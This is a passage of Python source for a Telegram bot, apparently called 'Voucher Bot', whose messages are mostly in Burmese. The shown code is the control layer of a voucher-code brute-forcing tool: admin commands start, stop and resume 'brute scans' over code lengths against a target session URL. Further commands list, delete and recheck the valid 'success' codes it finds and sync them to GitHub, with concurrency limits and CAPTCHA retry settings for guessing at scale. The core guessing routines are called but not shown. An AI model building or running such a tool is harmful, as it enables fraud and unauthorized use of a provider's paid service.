        prev_len = prev.get('lengths') or prev.get('length') or '?'
        prev_plans = ' / '.join(prev.get('plan_filters') or []) or 'any'
        await bot.reply_to(message,
            f"ယခင် scan ရပ်ထားသည် (mode: {prev.get('mode','?')}, "
            f"lengths: {prev_len}, target: {prev.get('target')}, "
            f"plan: {prev_plans}).\nပြန်စမလား၊ အသစ်စမလား?",
            reply_markup=markup)
        return

    await _start_brute_scan(chat_id, mode, lengths, target, plan_filters)


async def _start_brute_scan(chat_id, mode, lengths, target, plan_filters):
    plan_filters = plan_filters or []
    label    = MODE_INFO.get(mode, ("?",))[0]
    len_str  = ",".join(map(str, lengths))
    filter_note = f" | Filter: {' / '.join(plan_filters)}" if plan_filters else ""
    progress_msg = await bot.send_message(
        chat_id,
        f"Preparing... Mode {mode} ({label}), Lengths [{len_str}]{filter_note}"
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, lengths, chat_id, user_data[chat_id]['session_url'],
            scan_id, target=target, progress_msg=progress_msg,
            plan_filters=plan_filters,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    notify_state.pop(chat_id, None)
    limited_notify.pop(chat_id, None)


@bot.message_handler(commands=['stop'])
async def cmd_stop(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    data = scan_tasks.get(chat_id)
    if data and not data["task"].done():
        data["stop"] = True
        data["task"].cancel()
        await bot.reply_to(message,
            "⏹️ Scan ရပ်ပြီးပါပြီ။ /resume ဖြင့် ဆက်နိုင်သည်။")
    else:
        await bot.reply_to(message, "ရပ်ရန် scan မရှိပါ။")


@bot.message_handler(commands=['resume'])
async def cmd_resume(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(message, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    params = last_scan_params.pop(chat_id)
    save_state()
    lengths = params.get('lengths') or (
        [params['length']] if 'length' in params else [6]
    )
    await _start_brute_scan(
        chat_id, params['mode'], lengths, params['target'],
        params.get('plan_filters', [])
    )
    await bot.reply_to(message, "▶️ Scan ပြန်စပါပြီ။")


@bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
async def handle_resume_cb(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)
    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text(
                "Resume လုပ်ရန် scan မရှိပါ။",
                chat_id=chat_id, message_id=call.message.message_id
            )
            return
        params = last_scan_params.pop(chat_id)
        save_state()
        await bot.edit_message_text(
            "▶️ Scan ပြန်စပါပြီ။",
            chat_id=chat_id, message_id=call.message.message_id
        )
        lengths = params.get('lengths') or (
            [params['length']] if 'length' in params else [6]
        )
        await _start_brute_scan(
            chat_id, params['mode'], lengths, params['target'],
            params.get('plan_filters', [])
        )
    else:
        if chat_id in pending_brute:
            params = pending_brute.pop(chat_id)
            last_scan_params.pop(chat_id, None)
            save_state()
            await bot.edit_message_text(
                "🆕 Scan အသစ်စတင်ပါပြီ။",
                chat_id=chat_id, message_id=call.message.message_id
            )
            await _start_brute_scan(
                chat_id, params['mode'], params['lengths'],
                params['target'], params.get('plan_filters', [])
            )
        else:
            await bot.edit_message_text(
                "Command ထပ်မံပေးပို့ပါ။",
                chat_id=chat_id, message_id=call.message.message_id
            )


@bot.message_handler(commands=['status'])
async def cmd_status(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    active = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up = int(time.monotonic() - _start_time)
    h, r = divmod(up, 3600); m, s = divmod(r, 60)
    await bot.reply_to(message,
        f"📊 Bot Status\n\n"
        f"⏱ Uptime: {h}h {m}m {s}s\n"
        f"🔍 Active Scans: {active}\n"
        f"👥 Sessions Loaded: {len(user_data)}\n"
        f"📡 GitHub Sync: {'ON' if GITHUB_ENABLED else 'OFF'}\n"
        f"⚙️ Concurrency: {CONCURRENCY}"
    )


@bot.message_handler(commands=['saved'])
async def cmd_saved(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    success = success_texts.get(chat_id, [])
    limited = limited_texts.get(chat_id, [])
    if not success and not limited:
        await bot.reply_to(message, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if success:
        parts.append(f"✅ **Success Codes** ({len(success)})")
        for item in success:
            c    = item["code"]
            plan = item.get("plan", "N/A")
            parts.append(f"`{c}` – ⏳ {plan}")
    if limited:
        parts.append(f"\n⚠️ **Limited Codes** ({len(limited)})")
        parts.extend(limited)
    await send_chunks(chat_id, "\n".join(parts),
                      parse_mode="Markdown",
                      reply_to_message_id=message.message_id)


@bot.message_handler(commands=['delete_saved'])
async def cmd_delete_saved(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    sc = len(success_texts.get(chat_id, []))
    lc = len(limited_texts.get(chat_id, []))

    success_texts.pop(chat_id, None)
    limited_texts.pop(chat_id, None)
    notify_state.pop(chat_id, None)
    limited_notify.pop(chat_id, None)

    if GITHUB_ENABLED:
        try:
            results, sha = await get_file_content("result.json")
            if str(chat_id) in results:
                del results[str(chat_id)]
                await update_file_content_retry(
                    "result.json", results, sha,
                    f"Delete saved codes for {chat_id}"
                )
        except Exception as e:
            await bot.reply_to(message,
                f"⚠️ Local ဖျက်ပြီး၊ GitHub မှာတော့ error: `{e}`",
                parse_mode="Markdown")
            return
    await bot.reply_to(message,
        f"🗑️ ဖျက်ပြီးပါပြီ။\n  • Success: {sc}\n  • Limited: {lc}")


@bot.message_handler(commands=['notify'])
async def cmd_notify(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    notify_setting[chat_id] = not notify_setting.get(chat_id, False)
    save_state()
    await bot.reply_to(message,
        f"📢 Notify: {'ON ✅' if notify_setting[chat_id] else 'OFF ❌'}")


@bot.message_handler(commands=['recheck'])
async def cmd_recheck(message):
    if not is_admin(message):
        await bot.reply_to(message, "❌ No Permission")
        return
    chat_id = message.chat.id
    if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
        await bot.reply_to(message, "/setup ဖြင့် Session URL ထည့်ပါ။")
        return
    success = success_texts.get(chat_id, [])
    if not success:
        await bot.reply_to(message, "Recheck လုပ်ရန် success code မရှိပါ။")
        return

    await bot.reply_to(message, "⏳ Success codes ပြန်စစ်ဆေးနေပါသည်...")
    new_success = []
    for item in success:
        async with _voucher_sem:
            recode = await perform_check(
                user_data[chat_id]['session_url'], item["code"], chat_id,
                recheck=True
            )
        if recode:
            new_success.append(item)

    success_texts[chat_id] = new_success
    if new_success:
        await bot.reply_to(message,
            f"✅ Recheck ပြီး {len(new_success)} ခု ကျန်သည်။")
    else:
        await bot.reply_to(message, "Recheck ပြီး success code မကျန်ပါ။")


# ── Polling / main ────────────────────────────────────────────────────────
def _handle_signal():
    logger.info("Signal received — shutting down polling cleanly")
    _shutdown_event.set()

async def start_polling():
    backoff = 5
    try:
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGTERM, signal.SIGINT):
            try:
                loop.add_signal_handler(sig, _handle_signal)
            except (NotImplementedError, RuntimeError):
                pass
    except Exception:
        pass

    while not _shutdown_event.is_set():
        try:
            # Startup cleanup — clear webhook + stale updates
            try:
                await bot.delete_webhook(drop_pending_updates=True)
                logger.info("Cleared webhook & pending updates")
            except Exception as e:
                logger.warning(f"delete_webhook failed: {e}")

            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            logger.warning(f"Polling error: {e}. Retry in {backoff}s")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)
        except Exception as e:
            msg = str(e)
            if "409" in msg or "Conflict" in msg:
                logger.error(
                    "❌ 409 Conflict — duplicate bot instance running. "
                    "Railway → Settings → Deploy → Overlap time = 0. "
                    "Waiting 30s for the old instance to die..."
                )
                await asyncio.sleep(30)
            else:
                logger.exception(f"Unexpected polling error: {e}")
                await asyncio.sleep(backoff)
                backoff = min(backoff * 2, 60)


async def main():
    global session, _connector, _voucher_sem

    # Shared TCP connector (TCP connection pool)
    _connector = aiohttp.TCPConnector(
        limit=CONCURRENCY * 2,
        limit_per_host=CONCURRENCY * 2,
        ttl_dns_cache=300,
        enable_cleanup_closed=True,
        force_close=False,
    )

    # Shared ClientSession with DummyCookieJar (no per-check cookie storage)
    session = aiohttp.ClientSession(
        timeout=aiohttp.ClientTimeout(total=30),
        connector=_connector,
        connector_owner=False,
        cookie_jar=aiohttp.DummyCookieJar(),
    )

    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    logger.info(f"🚀 Voucher Bot starting... (CONCURRENCY={CONCURRENCY}, "
                f"CAPTCHA_MAX_TRIES={CAPTCHA_MAX_TRIES}, BATCH={BATCH_SIZE})")

    try:
        asyncio.create_task(web_server())
        if GITHUB_ENABLED:
            asyncio.create_task(github_update_scheduler())
        load_state()
        await load_saved_results()

        polling_task = asyncio.create_task(start_polling())

        # Wait for shutdown signal or polling end
        done, pending = await asyncio.wait(
            {polling_task, asyncio.create_task(_shutdown_event.wait())},
            return_when=asyncio.FIRST_COMPLETED
        )
        for t in pending:
            t.cancel()

    finally:
        logger.info("Shutting down...")
        try:
            await bot.delete_webhook()
        except Exception:
            pass
        await session.close()
        await _connector.close()


if __name__ == '__main__':
    asyncio.run(main())
